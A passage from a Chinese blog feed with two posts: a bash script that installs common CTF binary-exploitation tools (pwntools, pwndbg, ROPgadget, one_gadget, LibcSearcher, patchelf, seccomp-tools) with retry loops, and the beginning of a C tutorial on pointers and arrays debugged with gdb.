class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /ctfpwntools</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /ctfpwntools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">MAX_RETRY=3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 必要的更新、安装常用工具</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (apt-get update;apt-get -y install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential git vim gdb strace ltrace  socat netcat); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新、安装常用工具时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新、安装常用工具失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwntools</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (python3 -m pip install --upgrade pip;python3 -m pip install --upgrade pwntools); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwntools时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwntools失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwndbg</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg;<span class=\"built_in\">cd</span> pwndbg;./setup.sh;<span class=\"built_in\">echo</span> <span class=\"string\">&quot;source /ctfpwntools/pwndbg/gdbinit.py&quot;</span> &gt;&gt; ~/.gdbinit;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwndbg时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装pwndbg失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装glibc-all-in-one</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (git <span class=\"built_in\">clone</span> https://github.com/matrix1001/glibc-all-in-one.git;<span class=\"built_in\">cd</span> glibc-all-in-one/;python3 update_list;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装glibc-all-in-one时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装glibc-all-in-one失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装ROPgadget</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (pip install capstone;git <span class=\"built_in\">clone</span> https://github.com/JonathanSalwan/ROPgadget.git;<span class=\"built_in\">cd</span> ROPgadget;sudo python3 setup.py install;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装ROPgadget时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装ROPgadget失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># one_gadget</span></span><br><span class=\"line\"><span class=\"comment\"># 32位libc</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (apt -y install ruby;gem install one_gadget;dpkg --add-architecture i386;apt-get -y install libc6:i386 libgtk2.0-0:i386); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装one_gadget时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装one_gadget失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># LibcSearcher</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (git <span class=\"built_in\">clone</span> https://github.com/lieanu/LibcSearcher.git;<span class=\"built_in\">cd</span> LibcSearcher;python3 setup.py develop;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装LibcSearcher时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装LibcSearcher失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># patchelf</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (apt-get install autoconf automake libtool;git <span class=\"built_in\">clone</span> https://github.com/NixOS/patchelf.git;<span class=\"built_in\">cd</span> patchelf;./bootstrap.sh;./configure;make;make check;make install;<span class=\"built_in\">cd</span> ..); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装patchelf时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装patchelf失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##  seccomp //安装失败</span></span><br><span class=\"line\"><span class=\"comment\">## ruby版本会和上面那个onegadget冲突吗??</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (add-apt-repository ppa:brightbox/ruby-ng;apt-get install ruby2.6 ruby2.6-dev ;gem install seccomp-tools); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装seccomp时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装seccomp失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>pip还是pip3呢</p>\n<p>还有一些小问题、以及还有其他有用工具没安装</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.csdn.net/mandiheyanyu/article/details/122455348\">https://blog.csdn.net/mandiheyanyu/article/details/122455348</a></p>\n<p>安装工具参考: <a href=\"https://blingblingxuanxuan.github.io/2020/02/23/paper/\">https://blingblingxuanxuan.github.io/2020/02/23/paper/</a></p>\n",
            "tags": [
                "PWN入门",
                "脚本"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/",
            "url": "https://tangzichengcc.github.io/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/",
            "title": "c语言回炉重造-指针与数组",
            "date_published": "2023-09-30T15:39:17.000Z",
            "content_html": "<p>​\t回炉重造, 还是通过gdb调试一下,理解的比较好, 多写代码多调试!</p>\n<h2 id=\"指针与地址初探\"><a href=\"#指针与地址初探\" class=\"headerlink\" title=\"指针与地址初探\"></a>指针与地址初探</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x=<span class=\"number\">1</span>,y=<span class=\"number\">2</span>,z[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> *ip;</span><br><span class=\"line\">    ip = &amp;x;</span><br><span class=\"line\">    z[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">    z[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">    z[<span class=\"number\">8</span>] = <span class=\"number\">5</span>;</span><br><span class=\"line\">    y = *ip;</span><br><span class=\"line\">    *ip = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ip = &amp;z[<span class=\"number\">0</span>];</span><br><span class=\"line\">    </span><br><span class=\"line\">    x = <span class=\"number\">1</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>gcc -g main.c</p>\n<p>​\t\tip是一个指针,在第六行,把x的地址赋给了指针,所以ip的值就是x的地址,ip本身就是一个值,也有自己的地址,</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/image-20230927170316918.png\" alt=\"image-20230927170316918\" style=\"zoom:50%;\">\n\n<p>​\t\t感觉这种未初始化的数组或许能做信息泄露?</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/image-20230927170602436.png\" alt=\"image-20230927170602436\" style=\"zoom:50%;\">\n\n\n\n<h2 id=\"指针与函数参数\"><a href=\"#指针与函数参数\" class=\"headerlink\" title=\"指针与函数参数\"></a>指针与函数参数</h2><p>​\t\t函数传递指针,实现赋值. 主要是getint函数,获取任意值,然后转换成数值,int类型的数值 而不是char类型的数值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getch</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//将输入的字符流分解成整数</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getint</span><span class=\"params\">(<span class=\"type\">int</span> *pn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c,sign;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">isspace</span>(c = getch())) ;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"built_in\">isdigit</span>(c) &amp;&amp; c !=EOF &amp;&amp; c!=<span class=\"string\">&#x27;+&#x27;</span> &amp;&amp; c !=<span class=\"string\">&#x27;-&#x27;</span>)&#123; <span class=\"comment\">//输入不是数字、结束符号,+-符号时返回0</span></span><br><span class=\"line\">\t\tungetch(c);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsign = (c == <span class=\"string\">&#x27;-&#x27;</span>) ? <span class=\"number\">-1</span>:<span class=\"number\">1</span>; <span class=\"comment\">//获取符号</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (c==<span class=\"string\">&#x27;+&#x27;</span> || c ==<span class=\"string\">&#x27;-&#x27;</span>) </span><br><span class=\"line\">\t\tc = getch();</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">原来设想的数可能是 +1  -2这种,所以要先检测一下符号</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">这个循环的意思是, 假如输入了 12345 这种(不是一位的数值), 一个一个读取,然后前一位 乘10,逐级递增,这个没问题,但 c - 0是什么? </span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">c的话,本身是 字符 ,这里是减去0 的ascii码,就 取得了 整数 </span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (*pn=<span class=\"number\">0</span>; <span class=\"built_in\">isdigit</span>(c); c=getch()) </span><br><span class=\"line\">\t\t*pn = <span class=\"number\">10</span> * *pn + (c - <span class=\"string\">&#x27;0&#x27;</span>);</span><br><span class=\"line\">\t*pn *= sign;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (c != EOF)   <span class=\"comment\">//先缓存一下</span></span><br><span class=\"line\">\t\tungetch(c);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE 10</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> n, <span class=\"built_in\">array</span>[SIZE],getint(<span class=\"type\">int</span> *);</span><br><span class=\"line\">    <span class=\"comment\">// 实现给一个整形数组 赋值</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (n=<span class=\"number\">0</span>; n &lt; SIZE &amp;&amp; getint(&amp;<span class=\"built_in\">array</span>[n]) != EOF; n++)</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (n=<span class=\"number\">0</span>; n &lt; SIZE; n++) <span class=\"comment\">//打印</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the %d number is %d\\n&quot;</span>,n,<span class=\"built_in\">array</span>[n]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> BUFSIZE 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> buf[BUFSIZE];</span><br><span class=\"line\"><span class=\"type\">int</span> bufp =<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getch</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (bufp &gt; <span class=\"number\">0</span> ) ? buf[--bufp] : getchar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span> c)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (bufp &gt;= BUFSIZE)</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ungetch: too many characters\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tbuf[bufp++] = c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t</p>\n<p>关于 c-‘0’的问题  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">for</span> (*pn=<span class=\"number\">0</span>; <span class=\"built_in\">isdigit</span>(c); c=getch()) </span><br><span class=\"line\">*pn = <span class=\"number\">10</span> * *pn + (c - <span class=\"string\">&#x27;0&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>​\t 输入12345, ascii的话就是49 50 51 52 53<br>问题在于, 对于getchar()得到的数值,会是ascii码, 而直接赋值得到的是内存中数值,所以需要这么一个转换</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 